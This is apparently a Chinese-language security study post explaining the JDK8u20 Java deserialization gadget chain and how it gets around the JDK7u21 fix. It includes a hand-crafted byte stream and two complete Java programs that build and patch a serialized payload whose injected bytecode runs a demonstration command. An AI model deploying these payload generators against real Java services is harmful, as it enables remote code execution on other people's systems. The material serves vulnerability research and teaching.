---
created: '21/12/01'
title: 反序列化篇之JDK8u20
tags:
  - java
  - java安全
  - 反序列化
---
# 反序列化篇之JDK8u20

## 书接上文
在JDK7u21中修复JDK7u21链的方式是判断`AnnotationInvocationHandler`的`type`属性是否为注解类，如果不是的话则抛出一个异常。
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211130194851.png)
这里我们需要注意的是在抛出异常之前，已经执行了`var1.defaultReadObject()`还原了`AnnotationInvocationHandler`对象，但是由于后续抛出异常，导致我们整个反序列化逻辑断开，程序终止运行，那么我们是否可能使程序在抛出异常之后也能够继续执行呢？

## try-catch嵌套
假设存在以下代码，思考一下最终的运行结果是什么？
```java
public static void main(String[] args) throws Exception {
        try {
            System.out.println("Start");
            try {
                int a = 1/0;
            } catch (ArithmeticException e) {
                throw new InvalidObjectException("Invalid");
                System.out.println("In");
            }
        } catch (Exception e) {
        }
        System.out.println("End");
    }
```
最终的数据结果为
```
Start
End
```
这里其实就涉及到java的异常捕捉机制，假如在一个嵌套try-catch结构内，内部的try-catch最终抛出一个异常，而外部的try-catch正常执行，由于内部的try-catch抛出异常，外部的try-catch也会触发catch，但是假如外部的catch不再向外抛出异常而是忽略，那么整个程序就不会终端运行，而是会一直运行直到End，这就是我们想要的。

现在我们需要寻找到一个类，满足以下条件:
1. 实现 Serializable
2. 重写了 readObject 方法
3. readObject 方法还存在对 readObject 的调用，并且对调用的 readObject 方法进行了异常捕获并继续执行

### BeanContextSupport
最终我们找到了想要的类: `java.beans.beancontext.BeanContextSupport`，其关键代码如下:
```java
private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {

        synchronized(BeanContext.globalHierarchyLock) {
            ois.defaultReadObject();

            initialize();

            bcsPreDeserializationHook(ois);

            if (serializable > 0 && this.equals(getBeanContextPeer()))
                readChildren(ois);

            deserialize(ois, bcmListeners = new ArrayList(1));
        }
    }
 public final void readChildren(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        int count = serializable;

        while (count-- > 0) {
            Object                      child = null;
            BeanContextSupport.BCSChild bscc  = null;

            try {
                child = ois.readObject();
                bscc  = (BeanContextSupport.BCSChild)ois.readObject();
            } catch (IOException ioe) {
                continue;
            } catch (ClassNotFoundException cnfe) {
                continue;
            }
            // ... 
    }
```

## 序列化机制

### 引用机制
> 在序列化流程中，对象所属类、对象成员属性等数据都会被使用固定的语法写入到序列化数据，并且会被特定的方法读取；在序列化数据中，存在的对象有null、new objects、classes、arrays、strings、back references等，这些对象在序列化结构中都有对应的描述信息，并且每一个写入字节流的对象都会被赋予引用`Handle`，并且这个引用`Handle`可以反向引用该对象（使用`TC_REFERENCE`结构，引用前面handle的值），引用`Handle`会从`0x7E0000`开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用Handle会重新从`0x7E0000`开始。

举一个简单的例子如下:
```java
import java.io.*;

public class exp implements Serializable {
    private static final long serialVersionUID = 100L;
    public static int num = 0;
    private void readObject(ObjectInputStream input) throws Exception {
        input.defaultReadObject();
    }
    public static void main(String[] args) throws IOException {
        exp t = new exp();
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("test"));
        out.writeObject(t);
        out.writeObject(t); //第二次写入
        out.close();
    }
}
```
我们用SerializationDumper这个工具来查看其序列化后的数据:
```
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 3 - 0x00 03
        Value - exp - 0x657870
      serialVersionUID - 0x00 00 00 00 00 00 00 64
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 0 - 0x00 00
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 01
    classdata
      exp
        values
  TC_REFERENCE - 0x71
    Handle - 8257537 - 0x00 7e 00 01
```
可以注意到在最后部分出现了`TC_REFERENCE`块，那么反序列化时要如何处理`TC_REFERENCE`块呢？
```java
    private Object readObject0(boolean unshared) throws IOException {
        boolean oldMode = bin.getBlockDataMode();
        if (oldMode) {
            int remain = bin.currentBlockRemaining();
            if (remain > 0) {
                throw new OptionalDataException(remain);
            } else if (defaultDataEnd) {
                /*
                 * Fix for 4360508: stream is currently at the end of a field
                 * value block written via default serialization; since there
                 * is no terminating TC_ENDBLOCKDATA tag, simulate
                 * end-of-custom-data behavior explicitly.
                 */
                throw new OptionalDataException(true);
            }
            bin.setBlockDataMode(false);
        }

        byte tc;
        while ((tc = bin.peekByte()) == TC_RESET) {
            bin.readByte();
            handleReset();
        }

        depth++;
        try {
            switch (tc) {
                // ...
                case TC_REFERENCE:
                    return readHandle(unshared);
                // ...    
            }
        } catch () {
           // ...
        }
        // ...
```
readHandle方法代码如下:
```java
private Object readHandle(boolean unshared) throws IOException {
        if (bin.readByte() != TC_REFERENCE) {
            throw new InternalError();
        }
        passHandle = bin.readInt() - baseWireHandle;
        if (passHandle < 0 || passHandle >= handles.size()) {
            throw new StreamCorruptedException(
                String.format("invalid handle value: %08X", passHandle +
                baseWireHandle));
        }
        if (unshared) {
            // REMIND: what type of exception to throw here?
            throw new InvalidObjectException(
                "cannot read back reference as unshared");
        }

        Object obj = handles.lookupObject(passHandle);
        if (obj == unsharedMarker) {
            // REMIND: what type of exception to throw here?
            throw new InvalidObjectException(
                "cannot read back reference to unshared object");
        }
        return obj;
    }
```
> 这个方法会从字节流中读取`TC_REFERENCE`标记段，它会把读取的引用`Handle`赋值给`passHandle`变量，然后传入`lookupObject()`，在`lookupObject()`方法中，如果引用的`handle`不为空、没有关联的`ClassNotFoundException`（`status[handle] != STATUS_EXCEPTION`），那么就返回给定`handle`的引用对象，最后由`readHandle`方法返回给对象。
> 也就是说，反序列化流程还原到`TC_REFERENCE`的时候，会尝试还原引用的`handle`对象。

### 成员抛弃机制
> 在反序列化中，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值，如果这个值出现在字节流中，**但是并不属于对象，则抛弃该值，但是如果这个值是一个对象的话，那么会为这个值分配一个 Handle。**

### 利用这些机制
了解了上面2个机制之后我们就可以想到一个绕过jdk7u21修复方法的机制，即:
1. 使用`BeanContextSupport`，利用其特殊的`readChildren`方法还原一个非法的`AnnotationInvocationHandler`对象，并留下一个Handle
2. 在我们HashObject发生哈希碰撞造成RCE之前还原非法的`AnnotationInvocationHandler`对象，使得之后反序列化相同对象时还原引用的`handle`对象

## exp1
这个exp1来自pwntester师傅，直接通过手动构造反序列化的字节码来写这个畸形的JDK8u20链(真是太强了)，不过理解起来可能会有点困难，利用到了成员抛弃机制，完整源码在[pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget):
```java
...
new Object[]{
                STREAM_MAGIC, STREAM_VERSION, // stream headers

                // (1) LinkedHashSet
                TC_OBJECT,
                TC_CLASSDESC,
                LinkedHashSet.class.getName(),
                -2851667679971038690L,
                (byte) 2,              // flags
                (short) 0,             // field count
                TC_ENDBLOCKDATA,
                TC_CLASSDESC,          // super class
                HashSet.class.getName(),
                -5024744406713321676L,
                (byte) 3,              // flags
                (short) 0,             // field count
                TC_ENDBLOCKDATA,
                TC_NULL,               // no superclass

                // Block data that will be read by HashSet.readObject()
                // Used to configure the HashSet (capacity, loadFactor, size and items)
                TC_BLOCKDATA,
                (byte) 12,
                (short) 0,
                (short) 16,            // capacity
                (short) 16192, (short) 0, (short) 0, // loadFactor
                (short) 2,             // size

                // (2) First item in LinkedHashSet
                templates, // TemplatesImpl instance with malicious bytecode

                // (3) Second item in LinkedHashSet
                // Templates Proxy with AIH handler
                TC_OBJECT,
                TC_PROXYCLASSDESC,          // proxy declaration
                1,                          // one interface
                Templates.class.getName(),  // the interface implemented by the proxy
                TC_ENDBLOCKDATA,
                TC_CLASSDESC,
                Proxy.class.getName(),      // java.lang.Proxy class desc
                -2222568056686623797L,      // serialVersionUID
                SC_SERIALIZABLE,            // flags
                (short) 2,                  // field count
                (byte) 'L', "dummy", TC_STRING, "Ljava/lang/Object;", // dummy non-existent field
                (byte) 'L', "h", TC_STRING, "Ljava/lang/reflect/InvocationHandler;", // h field
                TC_ENDBLOCKDATA,
                TC_NULL,                    // no superclass

                // (3) Field values
                // value for the dummy field <--- BeanContextSupport.
                // this field does not actually exist in the Proxy class, so after deserialization this object is ignored.
                // (4) BeanContextSupport
                TC_OBJECT,
                TC_CLASSDESC,
                BeanContextSupport.class.getName(),
                -4879613978649577204L,      // serialVersionUID
                (byte) (SC_SERIALIZABLE | SC_WRITE_METHOD),
                (short) 1,                  // field count
                (byte) 'I', "serializable", // serializable field, number of serializable children
                TC_ENDBLOCKDATA,
                TC_CLASSDESC,               // super class
                BeanContextChildSupport.class.getName(),
                6328947014421475877L,
                SC_SERIALIZABLE,
                (short) 1,                  // field count
                (byte) 'L', "beanContextChildPeer", TC_STRING, "Ljava/beans/beancontext/BeanContextChild;",
                TC_ENDBLOCKDATA,
                TC_NULL,                    // no superclass

                // (4) Field values
                // beanContextChildPeer must point back to this BeanContextSupport for BeanContextSupport.readObject to go into BeanContextSupport.readChildren()
                TC_REFERENCE, baseWireHandle + 12,
                // serializable: one serializable child
                1,

                // now we add an extra object that is not declared, but that will be read/consumed by readObject
                // BeanContextSupport.readObject calls readChildren because we said we had one serializable child but it is not in the byte array
                // so the call to child = ois.readObject() will deserialize next object in the stream: the AnnotationInvocationHandler
                // At this point we enter the readObject of the aih that will throw an exception after deserializing its default objects

                // (5) AIH that will be deserialized as part of the BeanContextSupport
                TC_OBJECT,
                TC_CLASSDESC,
                "sun.reflect.annotation.AnnotationInvocationHandler",
                6182022883658399397L,       // serialVersionUID
                (byte) (SC_SERIALIZABLE | SC_WRITE_METHOD),
                (short) 2,                  // field count
                (byte) 'L', "type", TC_STRING, "Ljava/lang/Class;",         // type field
                (byte) 'L', "memberValues", TC_STRING, "Ljava/util/Map;",   // memberValues field
                TC_ENDBLOCKDATA,
                TC_NULL,                    // no superclass

                // (5) Field Values
                Templates.class,            // type field value
                map,                        // memberValues field value

                // note: at this point normally the BeanContextSupport.readChildren would try to read the
                // BCSChild; but because the deserialization of the AnnotationInvocationHandler above throws,
                // we skip past that one into the catch block, and continue out of readChildren

                // the exception takes us out of readChildren and into BeanContextSupport.readObject
                // where there is a call to deserialize(ois, bcmListeners = new ArrayList(1));
                // Within deserialize() there is an int read (0) and then it will read as many obejcts (0)

                TC_BLOCKDATA,
                (byte) 4,                   // block length
                0,                          // no BeanContextSupport.bcmListenes
                TC_ENDBLOCKDATA,

                // (6) value for the Proxy.h field
                TC_REFERENCE, baseWireHandle + offset + 16, // refer back to the AnnotationInvocationHandler

                TC_ENDBLOCKDATA,
        };
...
```
1. 构造`LinkedHashSet`的结构信息
2.  写入payload中`TemplatesImpl`对象
3.  构造`Templates Proxy`的结构，一共2个成员:
    1.  这里定义了一个虚假的`dummy`成员,后续赋值为`BeanContextSupport`对象，虚假成员也会进行反序列化操作
    2.  真实的`h`成员，后续赋值为`InvocationHandler`对象
4.  赋值`dummy`成员的值为`BeanContextSupport`对象，同时构建了其结构。这里为了`BeanContextSupport`对象反序列化时能走到`readChildren`方法，做了以下2个操作:
    1.  设置`serializable`>0
    2.  父类 `beanContextChildPeer`成员的值为当前对象: 由于`BeanContextChildSupport`对象已经出现过了,这里直接进行`TC_REFERENCE`引用对应的`Handle`
5.  插入非法的`AnnotationInvocationHandler`对象。前面分析过在`readChildren`方法中会再次进行`ois.readObject()`，因此会将此对象反序列化并且捕捉异常，产生一个Handle
6.  赋值`h`成员的值，这里使用`TC_REFERENCE`引用到刚刚产生的newHandle即可，需要手动计算handle值

## exp2
这个exp2来自feihong师傅，通过正常反序列化后对字节码进行细微地调整来构造畸形的JDK8u20链，没有利用成员抛弃机制，也比前面的exp1稍微好理解一点
- 参考文章在[以一种更简单的方式构造JRE8u20 Gadget](https://xz.aliyun.com/t/8277)
- 完整源码在[feihong-cs/jre8u20_gadget](https://github.com/feihong-cs/jre8u20_gadget)
这里没有利用成员抛弃机制，而是利用到了LinkedHashSet反序列化时会一一反序列化map中对象的机制，先将`BeanContextSupport`放在最前面，让其产生非法的`AnnotationInvocationHandler`对象的newHandle，后续再正常地执行JDK7u21，整个链的构造逻辑大概如下:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211202092756.png)
> 在进行序列化的时候，向序列化流中写入了`4`个对象，但是通过修改序列化中的一些特殊的`byte`，构造了一个我们想要的序列化流。在反序列化的时候，`LinkedHashSet`读到的`size`为`3`,在反序列化第一个对象`BeanContextSupport`的时候，会进入到`BeanContextSupport`的`readChildren`逻辑，成功将`AnnotationInvocationHander`进行了还原（虽然`AnnotationInvocationHander`在反序列化的时候会抛出异常，但是`BeanContextSupport`捕捉了异常）。随后`LinkedHashSet`在反序列化第二个和三个元素的时候，会发生哈希碰撞，从而导致`RCE`。

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextSupport;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;


public class jdk8u20EXP {
    public static TemplatesImpl generateEvilTemplates() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        // 转换为bytes
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        // 进入 defineTransletClasses() 方法需要的条件
        setFieldValue(templates, "_name", "name" + System.nanoTime());
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());


        return templates;
    }

    public static void main(String[] args) throws Exception {
        // jdk 7u21
        TemplatesImpl templates = generateEvilTemplates();
        HashMap map = new HashMap();
        map.put("f5a5a608", "zero");

        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

        // 为tempHandler创造一层代理
        Templates proxy = (Templates) Proxy.newProxyInstance(jdk7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);
        // 实例化HashSet，并将两个对象放进去
        HashSet set = new LinkedHashSet();
        // 将恶意templates设置到map中
        map.put("f5a5a608", templates);
        // jdk7u21 end


        BeanContextSupport bcs = new BeanContextSupport();
        Class cc = Class.forName("java.beans.beancontext.BeanContextSupport");

        Field beanContextChildPeer = cc.getSuperclass().getDeclaredField("beanContextChildPeer");
        beanContextChildPeer.set(bcs, bcs);

        set.add(bcs);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);

        oos.writeObject(set);
        oos.writeObject(tempHandler);
        oos.writeObject(templates);
        oos.writeObject(proxy);
        oos.close();

        byte[] bytes = baous.toByteArray();
        System.out.println("[+] Modify HashSet size from  1 to 3");
        bytes[89] = 3; //修改hashset的长度（元素个数）

        //调整 TC_ENDBLOCKDATA 标记的位置，先暂时删除
        //0x73 = 115, 0x78 = 120
        //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 0 && bytes[i+1] == 0 && bytes[i+2] == 0 & bytes[i+3] == 0 &&
                    bytes[i+4] == 120 && bytes[i+5] == 120 && bytes[i+6] == 115){
                System.out.println("[+] Delete TC_ENDBLOCKDATA at the end of HashSet");
                bytes = Util.deleteAt(bytes, i + 5);
                break;
            }
        }

        //将 serializable 的值修改为 1
        //0x73 = 115, 0x78 = 120
        //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 120 && bytes[i+1] == 0 && bytes[i+2] == 1 && bytes[i+3] == 0 &&
                    bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 0 && bytes[i+7] == 115){
                System.out.println("[+] Modify BeanContextSupport.serializable from 0 to 1");
                bytes[i+6] = 1;
                break;
            }
        }

        /**
         TC_BLOCKDATA - 0x77
         Length - 4 - 0x04
         Contents - 0x00000000
         TC_ENDBLOCKDATA - 0x78
         **/

        //把这部分内容先删除，再附加到 AnnotationInvocationHandler 之后
        //目的是让 AnnotationInvocationHandler 变成 BeanContextSupport 的数据流
        //0x77 = 119, 0x78 = 120
        //0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 119 && bytes[i+1] == 4 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
                    bytes[i+4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 120){
                System.out.println("[+] Delete TC_BLOCKDATA...int...TC_BLOCKDATA at the End of BeanContextSupport");
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                bytes = Util.deleteAt(bytes, i);
                break;
            }
        }

        /*
              serialVersionUID - 0x00 00 00 00 00 00 00 00
                  newHandle 0x00 7e 00 28
                  classDescFlags - 0x00 -
                  fieldCount - 0 - 0x00 00
                  classAnnotations
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_NULL - 0x70
              newHandle 0x00 7e 00 29
         */
        //0x78 = 120, 0x70 = 112
        //0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 0 && bytes[i+1] == 0 && bytes[i+2] == 0 && bytes[i+3] == 0 &&
                    bytes[i + 4] == 0 && bytes[i+5] == 0 && bytes[i+6] == 0 && bytes[i+7] == 0 &&
                    bytes[i+8] == 0 && bytes[i+9] == 0 && bytes[i+10] == 0 && bytes[i+11] == 120 &&
                    bytes[i+12] == 112){
                System.out.println("[+] Add back previous delte TC_BLOCKDATA...int...TC_BLOCKDATA after invocationHandler");
                i = i + 13;
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x77);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x04);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Util.addAtIndex(bytes, i++, (byte) 0x78);
                break;
            }
        }

        //将 sun.reflect.annotation.nAnnotationInvocationHandler 的 classDescFlags 由 SC_SERIALIZABLE 修改为 SC_SERIALIZABLE | SC_WRITE_METHOD
        //         //这一步其实不是通过理论推算出来的，是通过debug 以及查看 pwntester的 poc 发现需要这么改
        //         //原因是如果不设置 SC_WRITE_METHOD 标志的话 defaultDataEd = true，导致 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1))
        // -> count = ois.readInt(); 报错，无法完成整个反序列化流程
        // 没有 SC_WRITE_METHOD 标记，认为这个反序列流到此就结束了
        // 标记： 7375 6e2e 7265 666c 6563 --> sun.reflect...
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 115 && bytes[i+1] == 117 && bytes[i+2] == 110 && bytes[i+3] == 46 &&
                    bytes[i + 4] == 114 && bytes[i+5] == 101 && bytes[i+6] == 102 && bytes[i+7] == 108 ){
                System.out.println("[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to " +
                        "SC_SERIALIZABLE | SC_WRITE_METHOD");
                i = i + 58;
                bytes[i] = 3;
                break;
            }
        }

        //加回之前删除的 TC_BLOCKDATA，表明 HashSet 到此结束
        System.out.println("[+] Add TC_BLOCKDATA at end");
        bytes = Util.addAtLast(bytes, (byte) 0x78);


        FileOutputStream fous = new FileOutputStream("jre8u20.ser");
        fous.write(bytes);

        //反序列化
        FileInputStream fis = new FileInputStream("jre8u20.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
        ois.close();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

## exp3
这个exp3来自沈沉舟师傅，也是通过正常反序列化后对字节码进行细微地调整来构造畸形的JDK8u20链，是exp2的简化版，修改的字节码更少，具体原理可以参见[这里](https://mp.weixin.qq.com/s/3bJ668GVb39nT0NDVD-3IA)，这里根据exp2和原理重写了下exp:

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextSupport;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.*;


public class jdk8u20EXP3 {

    public static TemplatesImpl generateEvilTemplates() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"notepad.exe\");";
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        // 转换为bytes
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        // 进入 defineTransletClasses() 方法需要的条件
        setFieldValue(templates, "_name", "name" + System.nanoTime());
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());


        return templates;
    }

    public static void main(String[] args) throws Exception {
        // 获取恶意的TemplatesImpl
        TemplatesImpl templates = generateEvilTemplates();
        // 新建2个map，第一个map用于哈希碰撞造成rce，第二个map作为BeanContextSupport的children
        HashMap map = new HashMap();
        HashMap map2 = new HashMap();
        // 先放入假的数据，防止在构造时触发rce
        map.put("f5a5a608", "zero");

        // 构造AnnotationInvocationHandler
        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

        // 为tempHandler创造一层代理
        Templates proxy = (Templates) Proxy.newProxyInstance(jdk7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);
        // 实例化HashSet
        HashSet set = new LinkedHashSet();


        BeanContextSupport bcs = new BeanContextSupport();
        bcs.beanContextChildPeer            = bcs;
        setFieldValue(bcs, "serializable", 1);
        setFieldValue(bcs, "children", map2);

        // map2将tempHandler放入，进入readChildren的try-catch-readObject中
        map2.put(tempHandler, null);
        // 先存放bcs，反序列化时会先反序列化bcs,从而留下恶意AnnotationInvocationHandler的Handle
        set.add(bcs);
        set.add(templates);
        // 后续proxy直接引用了前面的恶意Handle
        set.add(proxy);

        // 将真正的templates放入map中用于哈希碰撞
        map.put("f5a5a608", templates);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);

        oos.writeObject(set);
        oos.close();

        byte[] bytes = baous.toByteArray();


        //将 sun.reflect.annotation.nAnnotationInvocationHandler 的 classDescFlags 由 SC_SERIALIZABLE 修改为 SC_SERIALIZABLE | SC_WRITE_METHOD
        //         //这一步其实不是通过理论推算出来的，是通过debug 以及查看 pwntester的 poc 发现需要这么改
        //         //原因是如果不设置 SC_WRITE_METHOD 标志的话 defaultDataEd = true，导致 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1))
        // -> count = ois.readInt(); 报错，无法完成整个反序列化流程
        // 没有 SC_WRITE_METHOD 标记，认为这个反序列流到此就结束了
        // 标记： 7375 6e2e 7265 666c 6563 --> sun.reflect...
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 115 && bytes[i+1] == 117 && bytes[i+2] == 110 && bytes[i+3] == 46 &&
                    bytes[i + 4] == 114 && bytes[i+5] == 101 && bytes[i+6] == 102 && bytes[i+7] == 108 ){
                System.out.println("[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to " +
                        "SC_SERIALIZABLE | SC_WRITE_METHOD");
                i = i + 58;
                bytes[i] = 3;
                break;
            }
        }

        // 运行到BeanContextSupport.deserialize()中此时ois.readInt()时面对的序列化数据可能是个TC_OBJECT或者TC_NULL，为了让攻击顺利，必须让ois.readInt()面对的序列化数据是TC_BLOCKDATA包裹的整型变量0
        // 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78 ->
        // 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x70, 0x78
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 0x70 && bytes[i+1] == 0x77 && bytes[i+2] == 0x04 && bytes[i+3] == 0x00 && bytes[i + 4] == 0x00 && bytes[i+5] == 0x00 && bytes[i+6] == 0x00 && bytes[i+7] == 0x78){
                System.out.println("[+] Change 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78 -> 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x70, 0x78");
                bytes[i] = 0x77;
                bytes[i+1] = 0x04;
                bytes[i+2] = 0x00;
                bytes[i+6] = 0x70;
                break;
            }
        }

        // 序列化
        FileOutputStream fous = new FileOutputStream("jre8u20.ser");
        fous.write(bytes);

        // 反序列化
        FileInputStream fis = new FileInputStream("jre8u20.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
        ois.close();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

## 困惑与解惑
### 困惑1
exp3里有这么一段:
```

//将 sun.reflect.annotation.nAnnotationInvocationHandler 的 classDescFlags 由 SC_SERIALIZABLE 修改为 SC_SERIALIZABLE | SC_WRITE_METHOD
//         //这一步其实不是通过理论推算出来的，是通过debug 以及查看 pwntester的 poc 发现需要这么改
//         //原因是如果不设置 SC_WRITE_METHOD 标志的话 defaultDataEd = true，导致 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1))
// -> count = ois.readInt(); 报错，无法完成整个反序列化流程
// 没有 SC_WRITE_METHOD 标记，认为这个反序列流到此就结束了
// 标记： 7375 6e2e 7265 666c 6563 --> sun.reflect...
for(int i = 0; i < bytes.length; i++){
    if(bytes[i] == 115 && bytes[i+1] == 117 && bytes[i+2] == 110 && bytes[i+3] == 46 &&
            bytes[i + 4] == 114 && bytes[i+5] == 101 && bytes[i+6] == 102 && bytes[i+7] == 108 ){
        System.out.println("[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to " +
                "SC_SERIALIZABLE | SC_WRITE_METHOD");
        i = i + 58;
        bytes[i] = 3;
        break;
    }
}
```

这里将`AnnotationInvocationHandler`的`classDescFlags`添加了`SC_WRITE_METHOD`这个标志，这是为什么呢？

我们在`BeanContextSupport#readChildren`处打下断点，查看调用栈:

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211206091632.png)
这里有一个`readSerialData`，跟进代码:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211206091642.png)
现在代码走到了`slotDesc.invokeReadObject`处，而由于我们反序列化产生并捕捉了异常，这个函数中后续的代码将不再执行，即后续不会再设置`defaultDataEnd =` `_false_``;`，那么这个defaultDataEnd是用来做什么的呢？
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211206091653.png)
当成员块结束但没有TC_ENDBLOCKDATA时其会被设置为True。
当我们把上面那段修改标志的代码注释后再进行调试:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211206091712.png)
其会设置`defaultDataEnd=True`，由于异常，正常情况下后续设置`defaultDataEnd=False`的代码被跳过了。我们看看后续`ois.readInt()`，一直跟进到`DataInputStream#readInt`中:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211206091736.png)
继续跟进`in.read()`:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211206091746.png)
跟进`refill()`:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211206091755.png)
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211206091800.png)
